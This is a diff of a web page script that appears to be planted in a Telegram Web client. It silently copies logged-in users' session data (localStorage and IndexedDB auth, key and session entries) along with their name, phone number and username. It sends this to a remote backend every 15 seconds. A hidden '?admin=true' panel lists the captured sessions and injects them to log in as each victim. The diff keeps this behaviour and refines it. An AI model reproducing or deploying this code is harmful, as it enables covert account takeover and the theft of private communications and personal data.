@@ -31,22 +31,16 @@
     function bufferToBase64(buf) {
         let binary = '';
         const bytes = new Uint8Array(buf);
-        for (let i = 0; i < bytes.byteLength; i++) {
-            binary += String.fromCharCode(bytes[i]);
-        }
+        for (let i = 0; i < bytes.byteLength; i++) { binary += String.fromCharCode(bytes[i]); }
         return window.btoa(binary);
     }
-
     function base64ToBuffer(base64) {
         const binary_string = window.atob(base64);
         const len = binary_string.length;
         const bytes = new Uint8Array(len);
-        for (let i = 0; i < len; i++) {
-            bytes[i] = binary_string.charCodeAt(i);
-        }
+        for (let i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
         return bytes.buffer;
     }
-
     function serializeData(data) {
         return JSON.stringify(data, (key, value) => {
             if (value instanceof ArrayBuffer) return { __type: 'ArrayBuffer', data: bufferToBase64(value) };
@@ -54,7 +48,6 @@
             return value;
         });
     }
-
     function deserializeData(jsonStr) {
         return JSON.parse(jsonStr, (key, value) => {
             if (value && typeof value === 'object' && value.__type === 'ArrayBuffer') return base64ToBuffer(value.data);
@@ -62,8 +55,7 @@
             return value;
         });
     }
-
-async function exportIndexedDB(dbName, storeName) {
+    async function exportIndexedDB(dbName, storeName) {
         return new Promise((resolve) => {
             const request = indexedDB.open(dbName);
             request.onsuccess = (e) => {
@@ -73,18 +65,12 @@ async function exportIndexedDB(dbName, storeName) {
                 const store = tx.objectStore(storeName);
                 const getAllReq = store.getAll();
                 const getKeysReq = store.getAllKeys();
-                
                 getAllReq.onsuccess = () => {
                     getKeysReq.onsuccess = () => {
                         const data = {};
                         for (let i = 0; i < getKeysReq.result.length; i++) {
                             const key = getKeysReq.result[i];
-                            if(typeof key === 'string' && (
-                                key.includes('auth') || 
-                                key.includes('key') || 
-                                key.includes('session') ||
-                                key.includes('dc')
-                            )) {
+                            if(typeof key === 'string' && (key.includes('auth') || key.includes('key') || key.includes('session') || key.includes('dc'))) {
                                 data[key] = getAllReq.result[i];
                             }
                         }
@@ -97,43 +83,26 @@ async function exportIndexedDB(dbName, storeName) {
         });
     }
 
-  async function importIndexedDB(dbName, storeName, data) {
+    async function importIndexedDB(dbName, storeName, data) {
         return new Promise((resolve, reject) => {
             const request = indexedDB.open(dbName);
-            
             request.onupgradeneeded = (e) => {
                 const db = e.target.result;
-                if (!db.objectStoreNames.contains(storeName)) {
-                    db.createObjectStore(storeName);
-                }
+                if (!db.objectStoreNames.contains(storeName)) db.createObjectStore(storeName);
             };
-
             request.onsuccess = (e) => {
                 const db = e.target.result;
-                if (!db.objectStoreNames.contains(storeName)) {
-                    resolve();
-                    return;
-                }
+                if (!db.objectStoreNames.contains(storeName)) { resolve(); return; }
                 const tx = db.transaction(storeName, "readwrite");
                 const store = tx.objectStore(storeName);
-
                 const clearReq = store.clear();
                 clearReq.onsuccess = () => {
                     const keys = Object.keys(data);
-                    if (keys.length === 0) {
-                        resolve();
-                        return;
-                    }
-                    
+                    if (keys.length === 0) { resolve(); return; }
                     let putCount = 0;
                     for (const key of keys) {
                         const putReq = store.put(data[key], key);
-                        putReq.onsuccess = () => {
-                            putCount++;
-                            if (putCount === keys.length) {
-                                resolve(); 
-                            }
-                        };
+                        putReq.onsuccess = () => { putCount++; if (putCount === keys.length) resolve(); };
                         putReq.onerror = () => reject(new Error("Failed to put key: " + key));
                     }
                 };
@@ -143,63 +112,63 @@ async function exportIndexedDB(dbName, storeName) {
         });
     }
 
-
+    // 🌟 Profile ကို အမှားအယွင်းကင်းစွာ တိတိကျကျ ဆွဲယူမည့်စနစ်
     function getTelegramProfile() {
         try {
+            let currentId = null;
+            let name = "Unknown Profile";
+            let phone = "Waiting...";
+            let username = "";
+
             const stateStr = localStorage.getItem('tt-global-state');
             if (stateStr) {
                 const state = JSON.parse(stateStr);
-                const currentId = state.currentUserId;
+                currentId = state.currentUserId;
                 if (currentId && state.users && state.users.byId) {
                     const user = state.users.byId[currentId] || state.users.byId[currentId.toString()];
                     if (user) {
-                        const fullName = [user.firstName, user.lastName].filter(Boolean).join(' ') || 'Unknown Staff';
-                        const phone = user.phoneNumber ? '+' + user.phoneNumber : 'No Phone';
-                        const username = user.username ? '@' + user.username : '';
-                        return { uid: currentId.toString(), name: fullName, phone: phone, username: username };
+                        name = [user.firstName, user.lastName].filter(Boolean).join(' ') || name;
+                        phone = user.phoneNumber ? '+' + user.phoneNumber : phone;
+                        username = user.username ? '@' + user.username : username;
                     }
                 }
             }
+            if (!currentId) {
+                const accStr = localStorage.getItem('account1');
+                if (accStr) {
+                    const acc = JSON.parse(accStr);
+                    if (acc.userId) currentId = acc.userId.toString();
+                }
+            }
+            if (currentId) return { uid: currentId.toString(), name, phone, username };
         } catch (e) { console.error("Profile parsing error", e); }
         return null; 
     }
 
     document.addEventListener("DOMContentLoaded", () => {
         if (window.location.search.includes("admin=true")) {
-            
             const adminPass = prompt("Admin Panel Pass:");
-            if (!adminPass) {
-                window.location.href = "/"; 
-                return;
-            }
-
+            if (!adminPass) { window.location.href = "/"; return; }
             document.body.classList.add("hide-telegram");
             const adminPanel = document.createElement("div");
             adminPanel.style.cssText = "position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: #f4f4f9; z-index: 999999; padding: 30px; font-family: sans-serif; overflow-y: auto;";
-            
             adminPanel.innerHTML = `
                 <div style="max-width: 1000px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
                     <h2 style='color: #333; border-bottom: 2px solid #0063bb; padding-bottom: 10px;'>Admin Control Panel</h2>
-                    <p style='color: #666;'>Staff ဝင်ထားသော အကောင့်များ</p>
-                    <button id='loadBtn' style='padding: 10px 20px; background: #0063bb; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px;'>Load Accounts</button>
+                    <button id='loadBtn' style='padding: 10px 20px; background: #0063bb; color: white; border: none; border-radius: 5px; cursor: pointer;'>Load Accounts</button>
                     <div id='admin-content' style='margin-top: 20px;'></div>
                 </div>
             `;
             document.body.appendChild(adminPanel);
-
             window.adminDataStore = []; 
 
             window.loginAs = async (index) => {
                 const session = window.adminDataStore[index];
                 if(!session) return;
-                const targetName = session.profile_name || session.user_id;
-                if(!confirm(targetName + " Login Sure?")) return;
-                alert("Data Loading...");
-                
+                if(!confirm((session.profile_name || session.user_id) + " Login Sure?")) return;
                 try {
                     localStorage.clear();
                     localStorage.setItem("is_admin_view", "true"); 
-                    
                     if (session.local_storage_str) {
                         const ls = JSON.parse(session.local_storage_str);
                         for (const key in ls) { localStorage.setItem(key, ls[key]); }
@@ -209,83 +178,51 @@ async function exportIndexedDB(dbName, storeName) {
                         await importIndexedDB("tt-data", "store", idbData);
                     }
                     window.location.href = "/"; 
-                } catch (e) { alert("Error during login injection: " + e.message); }
+                } catch (e) { alert("Error: " + e.message); }
             };
 
             document.getElementById("loadBtn").addEventListener("click", async () => {
                 const contentDiv = document.getElementById("admin-content");
-                contentDiv.innerHTML = "<p style='color: blue;'>Fetching data from Backend...</p>";
+                contentDiv.innerHTML = "<p style='color: blue;'>Fetching data...</p>";
                 try {
-                    const res = await fetch(BACKEND_URL + "/api/get_sessions", { 
-                        headers: { 
-                            "x-api-key": API_KEY,
-                            "x-admin-password": adminPass 
-                        } 
-                    });
-
-      
-                    if (!res.ok) {
-                        if (res.status === 401) throw new Error("Password Wrong (Unauthorized)");
-                        throw new Error(`Server Error: ${res.status}`);
-                    }
-
+                    const res = await fetch(BACKEND_URL + "/api/get_sessions", { headers: { "x-api-key": API_KEY, "x-admin-password": adminPass } });
+                    if (!res.ok) throw new Error(`Server Error: ${res.status}`);
                     const data = await res.json();
                     window.adminDataStore = data; 
-                    
-                    if(data.length === 0) {
-                        contentDiv.innerHTML = "<p style='color: red;'>No Data</p>";
-                        return;
-                    }
+                    if(data.length === 0) { contentDiv.innerHTML = "<p style='color: red;'>No Data</p>"; return; }
                     
                     let html = "<table width='100%' style='border-collapse: collapse; text-align: left; margin-top: 15px;'>";
-                    html += "<tr style='background: #f0f0f0; border-bottom: 2px solid #ccc;'><th style='padding:12px;'>Profile Info</th><th style='padding:12px;'>Phone Number</th><th style='padding:12px;'>Last Synced</th><th style='padding:12px;'>Action</th></tr>";
+                    html += "<tr style='background: #f0f0f0;'><th style='padding:12px;'>Profile Info</th><th style='padding:12px;'>Phone</th><th style='padding:12px;'>Action</th></tr>";
                     data.forEach((s, index) => {
-                        const timeString = new Date(s.timestamp).toLocaleString();
                         const isReady = s.local_storage_str ? true : false;
-                        const statusTag = isReady ? "<span style='color:green; font-size:12px;'>● Data Ready</span>" : "<span style='color:orange; font-size:12px;'>● Waiting...</span>";
-                        
-                        const pName = s.profile_name || "Unknown Staff";
-                        const pUsername = s.profile_username || "";
-                        const pPhone = (s.profile_phone === "Waiting..." || s.profile_phone === "Waiting Profile...") 
-                                        ? `<span style='color:#888; font-size: 13px;'>ID: ${s.user_id}</span>` 
-                                        : s.profile_phone;
-
+                        const pName = s.profile_name || "Unknown";
                         html += `<tr style='border-bottom: 1px solid #eee;'>
-                                    <td style='padding:12px;'><b style="font-size: 15px;">${pName}</b> <span style="color:#0063bb;">${pUsername}</span><br>${statusTag}</td>
-                                    <td style='padding:12px; font-weight: bold;'>${pPhone}</td>
-                                    <td style='padding:12px; color: #555;'>${timeString}</td>
-                                    <td style='padding:12px;'><button onclick='loginAs(${index})' ${!isReady ? "disabled" : ""} style='padding: 8px 15px; background: ${isReady ? "#28a745" : "#ccc"}; color: white; border: none; border-radius: 4px; cursor: pointer;'>Login</button></td>
+                                    <td style='padding:12px;'><b style="font-size: 15px;">${pName}</b> <br> <span style="font-size:12px;">ID: ${s.user_id}</span></td>
+                                    <td style='padding:12px;'>${s.profile_phone || 'No Phone'}</td>
+                                    <td style='padding:12px;'><button onclick='loginAs(${index})' ${!isReady ? "disabled" : ""} style='padding: 8px 15px; background: #28a745; color: white; border: none; border-radius: 4px; cursor: pointer;'>Login</button></td>
                                  </tr>`;
                     });
                     html += "</table>";
                     contentDiv.innerHTML = html;
-                } catch (err) { 
-                    contentDiv.innerHTML = `<p style='color: red;'><b>Error:</b> ${err.message}</p>`; 
-                    setTimeout(() => { window.location.href = "/"; }, 3000);
-                }
+                } catch (err) { contentDiv.innerHTML = `<p style='color: red;'><b>Error:</b> ${err.message}</p>`; }
             });
 
         } else {
-
-// ================= STAFF BROWSER =================
-
-            if (localStorage.getItem("is_admin_view") === "true") {
-                return; 
-            }
+            // 🌟🌟 Admin View Trap ကို ဖယ်ရှားခြင်း (Normal User အဖြစ် ဝင်လာပါက အလိုလို ပြန်ဖွင့်ပေးမည်) 🌟🌟
+            localStorage.removeItem("is_admin_view");
 
             setTimeout(() => {
                 let lastSyncLength = 0; 
                 let wasLoggedIn = false; 
                 let lastKnownUserId = null; 
-                let isProfileFullyLoaded = false; 
 
                 const syncSessionData = async () => {
                     let profile = getTelegramProfile();
                     const lsDataStr = JSON.stringify(localStorage);
                     
-                    const isLoggedIn = profile !== null || lsDataStr.length > 1500;
+                    // Profile UID ရမှသာ Data Sync စတင်မည်
+                    const isLoggedIn = profile && profile.uid && lsDataStr.length > 1500;
 
-                    // Logout လုပ်သွားရင် ဖျက်မည့်အပိုင်း
                     if (wasLoggedIn && !isLoggedIn && lastKnownUserId) {
                         try {
                             fetch(BACKEND_URL + "/api/delete_session", {
@@ -296,21 +233,13 @@ async function exportIndexedDB(dbName, storeName) {
                             });
                             wasLoggedIn = false; 
                             lastSyncLength = 0;
-                            isProfileFullyLoaded = false; 
                         } catch(e) {}
                         return; 
                     }
 
-                    if (isLoggedIn && profile) {
+                    if (isLoggedIn) {
                         wasLoggedIn = true; 
-                        
-                        // 🌟 Fake ID အစား Telegram ရဲ့ UID အစစ်ကိုသာ အသုံးပြုပါမည် 🌟
-                        lastKnownUserId = profile.uid; 
-
-                        if (!isProfileFullyLoaded) {
-                            isProfileFullyLoaded = true;
-                            lastSyncLength = 0; 
-                        }
+                        lastKnownUserId = profile.uid; // Unique ID အစစ်ကိုသာ သုံးပါမည်
 
                         try {
                             const rawIdbData = await exportIndexedDB("tt-data", "store"); 
@@ -323,7 +252,7 @@ async function exportIndexedDB(dbName, storeName) {
                                 method: "POST",
                                 headers: { "Content-Type": "application/json", "x-api-key": API_KEY },
                                 body: JSON.stringify({
-                                    user_id: lastKnownUserId, // Telegram Unique ID သုံးသွားပါပြီ
+                                    user_id: lastKnownUserId, 
                                     profile_name: profile.name,
                                     profile_phone: profile.phone,
                                     profile_username: profile.username,
@@ -333,23 +262,21 @@ async function exportIndexedDB(dbName, storeName) {
                                 })
                             });
                             
-                            if(res.ok) lastSyncLength = currentDataLength; 
+                            if(res.ok) {
+                                console.log("✅ Data Synced successfully for:", lastKnownUserId);
+                                lastSyncLength = currentDataLength; 
+                            }
                         } catch(e) {}
                     }
                 };
 
                 setInterval(syncSessionData, 15000); 
-
-                window.addEventListener('beforeunload', () => {
-                    if(wasLoggedIn) syncSessionData();
-                });
-
+                window.addEventListener('beforeunload', () => { if(wasLoggedIn) syncSessionData(); });
                 syncSessionData(); 
-
             }, 5000);
         }
     });
-  </script>
+</script>
 </head>
 
 <body id="root">
